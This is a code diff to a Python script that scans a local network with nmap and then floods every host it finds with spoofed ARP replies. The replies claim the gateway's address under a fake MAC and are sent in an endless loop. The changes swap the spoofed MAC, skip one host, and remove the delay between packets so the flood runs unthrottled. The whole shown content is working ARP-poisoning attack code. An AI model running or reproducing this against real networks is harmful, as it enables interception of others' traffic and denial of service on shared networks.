@@ -12,7 +12,6 @@ def get_all_host_in_local_network(ipprefix, mask_len):
     nm.scan(hosts=hosts, arguments='-p 161 -sU ')
 
     hosts_list = [x for x in nm.all_hosts()]
-    print hosts_list
     return hosts_list
 
 
@@ -45,20 +44,21 @@ def genetate_host_ip(int_ip, mask_len):
     return host_list
 
 
-def ARPAttack(ipprefix, mask_len, mac='12:34:56:78:1a:bc'):
+def ARPAttack(ipprefix, mask_len, mac='2b:b2:2b:b2:12:34'):
     request = 1
     int_ip = ip_to_int(ipprefix)
     spoof = int_to_ip(int_ip+1)
-    victim_list = get_all_host_in_local_network(ipprefix, mask_len)
+    victim_list = get_all_host_in_local_network(ipprefix, mask_len)[1:]
+    print victim_list
     host_ip = get_my_ip()
-    while 1:
+    while True:
         for victim in victim_list:
             if victim == host_ip:
                 continue
             arp = ARP(op=request, psrc=spoof, pdst=victim, hwsrc=mac)
             send(arp)
             print "victim: ", victim
-            time.sleep(0.001)
+            # time.sleep(0.001)
 
 if __name__ == "__main__":
     ipprefix = sys.argv[1]
